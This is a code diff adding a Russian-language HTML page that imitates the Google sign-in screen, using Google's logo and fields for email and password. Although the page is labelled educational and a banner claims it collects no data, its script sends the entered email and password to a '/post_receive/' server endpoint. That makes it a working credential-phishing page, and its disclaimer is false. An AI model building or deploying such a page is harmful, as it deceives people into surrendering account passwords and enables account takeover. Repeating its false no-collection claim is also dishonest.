@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8"> <!-- ВАЖНО: Добавлена эта строка для правильной кодировки -->
+    <title>Пример страницы входа в Gmail (ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ)</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+        }
+
+        .login-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 400px;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 150px;
+        }
+
+        .input-field {
+            margin-bottom: 20px;
+        }
+
+        .input-field input {
+            width: 90%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .login-button {
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #2948ff;
+        }
+
+        .footer {
+            margin-top: 20px;
+            color: #777;
+            font-size: 14px;
+        }
+        #message {
+            margin-top: 10px;
+            font-weight: bold; /* Сделал сообщение жирным для лучшей видимости */
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+        </div>
+        <h2>Войдите в аккаунт Google</h2>
+        <div class="input-field">
+            <input type="email" id="emailInput" placeholder="Электронная почта или телефон">
+        </div>
+        <div class="input-field">
+            <input type="password" id="passwordInput" placeholder="Пароль">
+        </div>
+        <div id="message"></div>
+        <a href="https://www.ivpek.ru/" target="_blank">Перейти на сайт ИВпек (в новом окне)</a><br><br> <!-- Исправлена ссылка на ivpek.ru -->
+
+        <button class="login-button" onclick="sendData()">Войти</button>
+
+        <div class="footer">
+                    <a href="#">Нужна помощь?</a><br>
+            <a href="#">Создать аккаунт</a>
+        </div>
+        <p style="color: red; font-weight: bold;">ЭТО ТОЛЬКО ПРИМЕР. ЭТА СТРАНИЦА НЕ СОБИРАЕТ ДАННЫЕ!</p>
+        <a href="page2.html">Вернуться на страницу 2</a>
+    </div>
+
+    <script>
+        function sendData() {
+            var email = document.getElementById("emailInput").value;
+            var password = document.getElementById("passwordInput").value;
+            var messageDiv = document.getElementById("message");
+
+            var data = { email: email, password: password };
+
+            fetch('/post_receive/', { // Отправляем на '/post_receive/'
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    messageDiv.textContent = 'Данные успешно отправлены на сервер!';
+                    messageDiv.style.color = 'green';
+                    // Очистка полей после успешной отправки (опционально)
+                    document.getElementById("emailInput").value = '';
+                    document.getElementById("passwordInput").value = '';
+                } else {
+                    messageDiv.textContent = 'Ошибка при отправке текста на сервер. Статус: ' + response.status;
+                    messageDiv.style.color = 'red';
+                    console.error('Ошибка при отправке текста на сервер. Статус:', response.status);
+                }
+            })
+            .catch(error => {
+                messageDiv.textContent = 'Ошибка сети: ' + error;
+                messageDiv.style.color = 'red';
+                console.error('Ошибка сети:', error);
+            });
+        }
+    </script>
+</body>
+</html>
